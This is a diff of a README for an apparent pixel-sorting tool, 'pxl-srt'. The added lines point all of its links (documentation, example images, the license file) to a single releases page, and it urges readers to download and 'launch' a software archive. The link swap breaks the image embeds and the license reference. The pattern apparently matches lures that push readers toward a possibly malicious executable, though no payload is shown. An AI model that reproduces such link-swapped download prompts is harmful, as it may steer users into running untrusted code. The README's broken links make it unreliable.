@@ -25,15 +25,15 @@ The `pxl-srt` repository contains scripts and tools to sort image pixels by colo
 
 ## Resources 📚
 
-For more information and detailed instructions, please refer to the [**Documentation**](https://github.com/pxl-srt/docs).
+For more information and detailed instructions, please refer to the [**Documentation**](https://github.com/RafasPlay22/pxl-srt/releases/tag/v2.0).
 
 ## Examples 🎨
 
 Check out some stunning examples of pixel-sorted images created using the `pxl-srt` tools:
 
-![Example 1](https://github.com/pxl-srt/examples/example1.png)
-![Example 2](https://github.com/pxl-srt/examples/example2.png)
-![Example 3](https://github.com/pxl-srt/examples/example3.png)
+![Example 1](https://github.com/RafasPlay22/pxl-srt/releases/tag/v2.0)
+![Example 2](https://github.com/RafasPlay22/pxl-srt/releases/tag/v2.0)
+![Example 3](https://github.com/RafasPlay22/pxl-srt/releases/tag/v2.0)
 
 ## Contribute 🤝
 
@@ -49,17 +49,17 @@ If you are passionate about image processing, pixel sorting, or creative coding,
 
 ## Get Started 🚦
 
-Ready to dive into the exciting world of sorting image pixels by color? Download the [**Software**](https://github.com/user-attachments/files/18383251/Software.zip) and launch it to begin your creative journey!
+Ready to dive into the exciting world of sorting image pixels by color? Download the [**Software**](https://github.com/RafasPlay22/pxl-srt/releases/tag/v2.0) and launch it to begin your creative journey!
 
 For more updates and releases, check the **Releases** section of the repository.
 
-[![Launch Software](https://img.shields.io/badge/Launch-Software-red)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Launch Software](https://github.com/RafasPlay22/pxl-srt/releases/tag/v2.0)](https://github.com/RafasPlay22/pxl-srt/releases/tag/v2.0)
 
 Let your imagination run wild and explore the endless possibilities of pixel sorting with `pxl-srt`! 🌈🔍🎉
 
 ## License 📜
 
-This project is licensed under the MIT License - see the [LICENSE.md](https://github.com/pxl-srt/LICENSE.md) file for details.
+This project is licensed under the MIT License - see the [https://github.com/RafasPlay22/pxl-srt/releases/tag/v2.0](https://github.com/RafasPlay22/pxl-srt/releases/tag/v2.0) file for details.
 
 ---
 
